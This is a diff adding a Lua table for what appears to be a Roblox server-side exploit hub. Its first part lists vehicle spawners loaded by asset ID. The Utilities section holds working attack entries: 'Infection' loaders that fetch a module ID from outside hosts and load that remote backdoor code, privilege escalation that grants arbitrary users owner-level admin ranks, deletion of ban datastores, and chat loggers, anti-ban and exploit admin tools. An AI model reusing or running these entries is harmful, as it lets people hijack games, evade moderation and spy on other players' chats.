+			Function = function(Username: string) import(6940174400).load(Username) end
+		},
+		{
+			Name = "1994 Toyota MR2 SW20 GT-S",
+			Function = function(Username: string) import(6940249305).load(Username) end
+		},
+		{
+			Name = "2016 Nissan GTR R35",
+			Function = function(Username: string) import(6940251823).load(Username) end
+		},
+		{
+			Name = "2018 Lotus Evora GT 430",
+			Function = function(Username: string) import(6940254798).load(Username) end
+		},
+		{
+			Name = "Porsche 911 S Turbo",
+			Function = function(Username: string) import(6940257585).load(Username) end
+		},
+		{
+			Name = "Ford Focus RS",
+			Function = function(Username: string) import(6950898543).load(Username) end
+		},
+		{
+			Name = "Black Moped (T to wheelie)",
+			Function = function(Username: string) import(6937636870).load(Username) end 
+		},
+		{
+			Name = "Dirtbike (T to wheelie)",
+			Function = function(Username: string) import(6937648233).load(Username) end 
+		},
+		{
+			Name = "Honda HF2620 Racing Lawn Mower",
+			Function = function(Username: string) import(6938358631).load(Username) end 
+		},
+		{
+			Name = "Kawasaki Ninja H2R",
+			Function = function(Username: string) import(6938363631).load(Username) end 
+		},
+		{
+			Name = "2013 Ducati Monster 1200R",
+			Function = function(Username: string) import(6940119237).load(Username) end 
+		},
+		{
+			Name = "Yamaha XT660R",
+			Function = function(Username: string) import(6940133162).load(Username) end 
+		},
+		{
+			Name = "Scania P340 with load",
+			Function = function(Username: string) import(6938326195).load(Username) end 
+		},
+		{
+			Name = "Scania R620 V8",
+			Function = function(Username: string) import(6937654121).load(Username) end 
+		},
+		{
+			Name = "John Deere Tractor",
+			Function = function(Username: string) import(6940141206).load(Username) end 
+		},
+		{
+			Name = "Mitshibushi Mixer Lorry",
+			Function = function(Username: string) import(6940178708).load(Username) end 
+		},
+		{
+			Name = "Quad 1 (Plain Red)",
+			Function = function(Username: string) import(6950969704).load(Username) end 
+		},
+		{
+			Name = "Quad 2 (For racing more than utility)",
+			Function = function(Username: string) import(6938372238).load(Username) end 
+		},
+		{
+			Name = "Some Massive Truck with functioning tower and winch",
+			Function = function(Username: string) import(6951042442).load(Username) end 
+		},
+		{
+			Name = "John Deere Gator",
+			Function = function(Username: string) import(6950975587).load(Username) end 
+		},
+		{
+			Name = "2019 Scania P420 With Dumper",
+			Function = function(Username: string) import(6951045401).load(Username) end 
+		},
+		{
+			Name = "Tow Truck with working winch and bed",
+			Function = function(Username: string) import(6951047915).load(Username) end 
+		},
+		{
+			Name = "Piper PA-28 Cherokee",
+			Function = function(Username: string) import(6938384437).load(Username) end 
+		},
+		{
+			Name = "Lockheed Martin F-35B",
+			Function = function(Username: string) import(6939788712).load(Username) end 
+		},
+		{
+			Name = "Bell AH-1Z Viper",
+			Function = function(Username: string) import(6951069547).load(Username) end 
+		},
+		{
+			Name = "MH6 LITTLE BIRD",
+			Function = function(Username: string) import(6951074744).load(Username) end 
+		},
+		{
+			Name = "Stagecoach Double Decker Bus",
+			Function = function(Username: string) import(6938329792).load(Username) end 
+		},
+		{
+			Name = "City Bus",
+			Function = function(Username: string) import(6950961350).load(Username) end 
+		},
+		{
+			Name = "GTA 5 Style Taxi",
+			Function = function(Username: string) import(6950964367).load(Username) end 
+		},
+		{
+			Name = "UK Police BMW X5 (Marked)",
+			Function = function(Username: string) import(6937625906).load(Username) end 
+		},
+		{
+			Name = "UK Police Mercedes Sprinter",
+			Function = function(Username: string) import(6938291405).load(Username) end 
+		},
+		{
+			Name = "UK Ambulance",
+			Function = function(Username: string) import(6950947277).load(Username) end 
+		},
+		{
+			Name = "DaBaby Car",
+			Function = function(Username: string) import(6950881228).load(Username) end 
+		},
+		{
+			Name = "Free Candy Van",
+			Function = function(Username: string) import(6950888310).load(Username) end 
+		},
+		{
+			Name = "McDonalds Meme Car",
+			Function = function(Username: string) import(6951085949).load(Username) end 
+		},
+		{
+			Name = "Horse",
+			Function = function(Username: string) import(2992217896):Fire(Username) end
+		},
+		{
+			Name = "Skateboard",
+			Function = function(Username: string) import(5866530494).load(Username) end
+		},
+		{
+			Name = "Dababy Car",
+			Function = function(Username: string) import(8886179495).Iexp(Username) end
+		},
+		{
+			Name = "Dune Buggy (beige)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Dune Buggy (beige)") end
+		},
+		{
+			Name = "Dune Buggy (blue)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Dune Buggy (blue)") end
+		},
+		{
+			Name = "Dune Buggy (orange)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Dune Buggy (orange)") end
+		},
+		{
+			Name = "Light Utility Vehicle (black)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Light Utility Vehicle (black)") end
+		},
+		{
+			Name = "Light Utility Vehicle (green camo)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Light Utility Vehicle (green camo)") end
+		},
+		{
+			Name = "Light Utility Vehicle (pink)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Light Utility Vehicle (pink)") end
+		},
+		{
+			Name = "Light Utility Vehicle (white camo)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Light Utility Vehicle (white camo)") end
+		},
+		{
+			Name = "Motorcycle",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Motorcycle") end
+		},
+		{
+			Name = "Pickup Truck (blue)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Pickup Truck (blue)") end
+		},
+		{
+			Name = "Pickup Truck (bronze)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Pickup Truck (bronze)") end
+		},
+		{
+			Name = "Pickup Truck (white)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Pickup Truck (white)") end
+		},
+		{
+			Name = "Police Car",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Police Car") end
+		},
+		{
+			Name = "SUV (black)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "SUV (black)") end
+		},
+		{
+			Name = "SUV (blue)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "SUV (blue)") end
+		},
+		{
+			Name = "SUV (white)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "SUV (white)") end
+		},
+		{
+			Name = "Sedan (aqua)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Sedan (aqua)") end
+		},
+		{
+			Name = "Sedan (black)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Sedan (black)") end
+		},
+		{
+			Name = "Sedan (orange)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Sedan (orange)") end
+		},
+		{
+			Name = "Sedan (red)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Sedan (red)") end
+		},
+		{
+			Name = "Sedan (white)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Sedan (white)") end
+		},
+		{
+			Name = "Sports Car (blue)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Sports Car (blue)") end
+		},
+		{
+			Name = "Sports Car (red)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Sports Car (red)") end
+		},
+		{
+			Name = "Sports Car (white)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Sports Car (white)") end
+		},
+		{
+			Name = "Supercar (blue)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Supercar (blue)") end
+		},
+		{
+			Name = "Supercar (green)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Supercar (green)") end
+		},
+		{
+			Name = "Supercar (yellow)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Supercar (yellow)") end
+		},
+		{
+			Name = "Van (1970)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Van (1970)") end
+		},
+		{
+			Name = "Van (pro)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Van (pro)") end
+		},
+		{
+			Name = "Van (white)",
+			Function = function(Username: string) import(12351577874).GetVehicle(Username, "Van (white)") end
+		},
+	},
+
+	Utilities = {
+		{
+			Name = "Mr Bean Admin",
+			Function = function(Username: string) import(87604650375097):Fire("XD", Username) end
+		},
+		{
+			Name = "Zombie Infection Gui",
+			Function = function(Username: string) import(18676922851)(Username) end
+		},
+		{
+			Name = "Crystal Chat Hax",
+			Function = function(Username: string) import(17803570134)(Username) end
+		},
+		{
+			Name = "Chat Logger",
+			Function = function(Username: string) import(5139065634).load(Username) end
+		},
+		{
+			Name = "Arc Storage",
+			Function = function(Username: string) import(7274736492)(Username) end
+		},
+		{
+			Name = "Old SSP Infection",
+			Function = function(Username: string) import(7218386196) end
+		},
+		{
+			Name = "Nexus Infection",
+			Function = function(Username: string) import(16467295798) end
+		},
+		{
+			Name = "Nova Infection",
+			Function = function(Username: string) import(18609289076):a() end
+		},
+		{
+			Name = "Luna Infection",
+			Function = function(Username: string) import(17792922752) end
+		},
+		{ 
+			Name = "SolarScripts Infection",
+			Function = function(Username: string) import(tonumber(HttpService:GetAsync("https://r1.cdn.rostech.dev/sm3"))) end
+		},
+		{ 
+			Name = "Torrent Infection",
+			Function = function(Username: string) import(tonumber(HttpService:GetAsync("https://serversiding.com/api/v1/verifying"))) end
+		},
+		{ 
+			Name = "Monogon Infection",
+			Function = function(Username: string) import(tonumber(HttpService:GetAsync("https://assets.delivery/asset"))) end
+		},
+		{ 
+			Name = "Aureus Infection",
+			Function = function(Username: string) import(tonumber(HttpService:GetAsync("https://user.aureus.wtf/aurueusuesufes"))) end
+		},
+		{ 
+			Name = "Metability Infection",
+			Function = function(Username: string) import(tonumber(HttpService:GetAsync("https://forumsroblox.com"))) end
+		},
+		{ 
+			Name = "Serverside.fun Infection",
+			Function = function(Username: string) import(tonumber(HttpService:GetAsync("https://assetdelivery.org"))) end
+		},
+		{ 
+			Name = "ExSer Infection",
+			Function = function(Username: string) import(tonumber(HttpService:GetAsync("https://api.exser.pp.ua/delivery"))) end
+		},
+		{ 
+			Name = "Zephal Infection",
+			Function = function(Username: string) import(tonumber(HttpService:GetAsync("https://assetproxy.org/"))) end
+		},
+		{
+			Name = "Serverside.io Infection",
+			Function = function(Username: string) import(tonumber(HttpService:GetAsync("https://api.serverside.gg/v2/zhudfszboiuasdfgboiuzg4238907gfsd"))) end
+		},
+		{
+			Name = "Azure Infection",
+			Function = function(Username: string) import(tonumber(HttpService:GetAsync("https://assetdelivery.co"))) end
+		},
+		{
+			Name = "COFS Infection",
+			Function = function(Username: string) import(16360626052) end
+		},
+		{
+			Name = "Temperance Infection",
+			Function = function(Username: string) import(16349786981) end
+		},
+		{ 
+			Name = "Black Men's Admin",
+			Function = function(Username: string) import(9849865333).Sub2BestMomentsHD(Username) end
+		},
+		{ 
+			Name = "Ro-Exploit V7",
+			Function = function(Username: string) import(6146060838)(Username) end
+		},
+		{ 
+			Name = "Ro-Exploit V6",
+			Function = function(Username: string) import(15888404352)(Username) end
+		},
+		{ 
+			Name = "Ro-Exploit V5",
+			Function = function(Username: string) import(13895319375)(Username) end
+		},
+		{ 
+			Name = "Ro-Exploit V4",
+			Function = function(Username: string) import(13895606598)(Username) end
+		},
+		{ 
+			Name = "Topkek 5.3",
+			Function = function(Username: string) import(14006218970)(Username) end
+		},
+		{ 
+			Name = "Topkek 5.2",
+			Function = function(Username: string) import(14649399744)(Username) end
+		},
+		{ 
+			Name = "Topkek 4.0 Stella",
+			Function = function(Username: string) import(4949740784).load(Username) end
+		},
+		{ 
+			Name = "Topkek 4.0 SS",
+			Function = function(Username: string) import(14015289575)(Username, "4.0") end
+		},
+		{ 
+			Name = "Topkek 4.0 SS Extra",
+			Function = function(Username: string) import(14015289575)(Username, "4.0 Extra") end
+		},
+		{ 
+			Name = "Topkek 3.0",
+			Function = function(Username: string) import(14015289575)(Username, "3.0") end
+		},
+		{ 
+			Name = "Topkek 2.0",
+			Function = function(Username: string) import(14015289575)(Username, "2.0") end
+		},
+		{ 
+			Name = "Topkek 0.8",
+			Function = function(Username: string) import(14015289575)(Username, "0.8") end
+		},
+		{ 
+			Name = "Adionts Chat logger",
+			Function = function(Username: string) import(12157891969)(Username) end
+		},
+		{ 
+			Name = "Infinite Yeild FE (IY FE)",
+			Function = function(Username: string) import(14035238433)(Username) end
+		},
+		{ 
+			Name = "Infinite Yeild (IY)",
+			Function = function(Username: string) import(7624679472)(Username) end
+		},
+		{ 
+			Name = "Infinite Yeild Reborn (IYR)",
+			Function = function(Username: string) import(17799578371).IYReborn(Username) end
+		},
+		{ 
+			Name = "Infinite Yeild 2D (IY 2D)",
+			Function = function(Username: string) import(13971900136)(Username) end
+		},
+		{ 
+			Name = "Infinite Yeild Edit (IY Edit)",
+			Function = function(Username: string) import(5390833042)(Username) end
+		},
+		{ 
+			Name = "Adiont's Infinite Yeild (Adiont's IY)",
+			Function = function(Username: string) import(11762041194)(Username) end
+		},
+		{ 
+			Name = "Snake Venom",
+			Function = function(Username: string) import(5784355926):SnakeVenomOwnerByIgorJogasPlay(Username) end
+		},
+		{ 
+			Name = "Snake Venom Owner",
+			Function = function(Username: string) import(5169994842):SnakeVenom(Username) end
+		},
+		{ 
+			Name = "HyperSkiddedAdmin",
+			Function = function(Username: string) import(7652199956).HyperSkiddedAdmin(Username, Color3.fromRGB(255,255,255), Color3.fromRGB(0,0,0), "square", true) end
+		},
+		{ 
+			Name = "Sharkblood V2",
+			Function = function(Username: string) import(6430681159):SharkBloodV2Giver(Username) end
+		},
+		{ 
+			Name = "Add HD Admin",
+			Function = function(Username: string) import(4893870373).load(Username) end
+		},
+		{ 
+			Name = "Add Kohl's Admin Infinite",
+			Function = function(Username: string) import(4976432351):Fire(Username) end
+		},
+		{ 
+			Name = "HD Admin Rankless",
+			Function = function(Username: string) _G.HDAdminMain:GetModule("cf"):SetRank(Players[Username], game.CreatorId, 0, "Perm") end
+		},
+		{ 
+			Name = "HD Admin Vip",
+			Function = function(Username: string) _G.HDAdminMain:GetModule("cf"):SetRank(Players[Username], game.CreatorId, 1, "Perm") end
+		},
+		{ 
+			Name = "HD Admin Mod",
+			Function = function(Username: string) _G.HDAdminMain:GetModule("cf"):SetRank(Players[Username], game.CreatorId, 2, "Perm") end
+		},
+		{ 
+			Name = "HD Admin Admin",
+			Function = function(Username: string) _G.HDAdminMain:GetModule("cf"):SetRank(Players[Username], game.CreatorId, 3, "Perm") end
+		},
+		{ 
+			Name = "HD Admin HeadAdmin",
+			Function = function(Username: string) _G.HDAdminMain:GetModule("cf"):SetRank(Players[Username], game.CreatorId, 4, "Perm") end
+		},
+		{ 
+			Name = "HD Admin Owner",
+			Function = function(Username: string) _G.HDAdminMain:GetModule("cf"):SetRank(Players[Username], game.CreatorId, 5, "Perm") end
+		},
+		{ 
+			Name = "HD Admin Above Owner",
+			Function = function(Username: string) _G.HDAdminMain:GetModule("cf"):SetRank(Players[Username], game.CreatorId, (math.huge), "Perm") end
+		},
+		{ 
+			Name = "Khols Admin Rankless",
+			Function = function(Username: string) _G.setPower:Fire(Username,0) end
+		},
+		{ 
+			Name = "Khols Admin Vip",
+			Function = function(Username: string) _G.setPower:Fire(Username,1) end
+		},
+		{ 
+			Name = "Khols Admin Mod",
+			Function = function(Username: string) _G.setPower:Fire(Username,2) end
+		},
+		{ 
+			Name = "Khols Admin Admin",
+			Function = function(Username: string) _G.setPower:Fire(Username,3) end
+		},
+		{ 
+			Name = "Khols Admin Super Admin",
+			Function = function(Username: string) _G.setPower:Fire(Username,4) end
+		},
+		{ 
+			Name = "Khols Admin Owner",
+			Function = function(Username: string) _G.setPower:Fire(Username,5) end
+		},
+		{ 
+			Name = "Khols Admin Creator",
+			Function = function(Username: string) _G.setPower:Fire(Username,6) end
+		},
+		{ 
+			Name = "Rocky Admin",
+			Function = function(Username: string) import(7163694262).AddRocky(Username) end
+		},
+		{ 
+			Name = "Adonis Admin",
+			Function = function(Username: string) 
+				import(17321363563)(Username, false)
+			end
+		},
+		{ 
+			Name = "Adonis Admin Nightly",
+			Function = function(Username: string) 
+				import(17321363563)(Username, true)
+			end
+		},
+		{ 
+			Name = "Birb Admin",
+			Function = function(Username: string) import(5315895355):BirbAdmin(Username) end
+		},
+		{ 
+			Name = "Frank's Admin",
+			Function = function(Username: string) import(5506895582):FranksAdmin("Frank",Username) end
+		},
+		{ 
+			Name = "Khols Admin Epix Edit",
+			Function = function(Username: string) import(522666193).giveAdmin(Username) end
+		},
+		{ 
+			Name = "Quantom Admin",
+			Function = function(Username: string) import(12144872922):Fire(Username) end
+		},
+		{ 
+			Name = "Spark Admin",
+			Function = function(Username: string) import(5092096919)(Username, ";") end
+		},
+		{ 
+			Name = "Stratosphere Admin",
+			Function = function(Username: string) import(4741673518).load(Username) end
+		},
+		{ 
+			Name = "Undetected Admin",
+			Function = function(Username: string) import(4953013815):stfu(Username) end
+		},
+		{ 
+			Name = "MML Admin",
+			Function = function(Username: string) import(12109440243).MMLV3(Username) end
+		},
+		{ 
+			Name = "Adiont Dark Dex V4",
+			Function = function(Username: string) import(12146718110):Fire(Username) end
+		},
+		{ 
+			Name = "Light Dex V1",
+			Function = function(Username: string) import(12146632330):Fire(Username) end
+		},
+		{ 
+			Name = "New Dex 1.0.0",
+			Function = function(Username: string) import(14572394952)(Username) end
+		},
+		{ 
+			Name = "Dark Dex V1",
+			Function = function(Username: string) import(12297970381):Fire(Username) end
+		},
+		{ 
+			Name = "Adonis Dark Dex V4",
+			Function = function(Username: string) import(12147037675)(Username) end
+		},
+		{ 
+			Name = "Adonis New Dex 1.0.2",
+			Function = function(Username: string) import(17324491426)(Username) end
+		},
+		{ 
+			Name = "Teefus's Exoliner",
+			Function = function(Username: string) import(4458722193):Exoliner("lol", Username) end
+		},
+		{ 
+			Name = "Exoliner V1",
+			Function = function(Username: string) import(4658036496):Fire("cCcZ[r@@,Vq8tg@d}.n<C~IjUM+IQ`", Username) end
+		},
+		{ 
+			Name = "Exoliner V2",
+			Function = function(Username: string) import(16308206484)(Username) end
+		},
+		{ 
+			Name = "Intent Admin",
+			Function = function(Username: string) import(7015385529):Fire("Intent", Username) end
+		},
+		{ 
+			Name = "F3X Btools",
+			Function = function(Username: string) import(12158566951)(Username) end
+		},
+		{
+			Name = "Btools",
+			Function = function(Username: string) import(16530393933)(Username) end
+		},
+		{ 
+			Name = "HD Admin Unban All",
+			Function = function(Username: string) DataStoreService:GetDataStore("HDAdminSystemData".._G.HDAdminMain.settings.SystemDataStoreVersion):RemoveAsync("Banland") end
+		},
+		{ 
+			Name = "Commander Admin Unban All",
+			Function = function(Username: string) DataStoreService:GetDataStore("commander.bans"):RemoveAsync("data") end
+		},
+		{ 
+			Name = "Kohl's Admin Infinite Unban All",
+			Function = function(Username: string) ReplicatedStorage:FindFirstChild("b\a\n\a\n\a"):FindFirstChild("\b\a\n").Value = "" end
+		},
+		{ 
+			Name = "Anti Leave",
+			Function = function(Username: string) import(12673588283) end
+		},
+		{ 
+			Name = "Anti Ban Gui",
+			Function = function(Username: string) import(12179326311)(Username) end
+		},
+	},
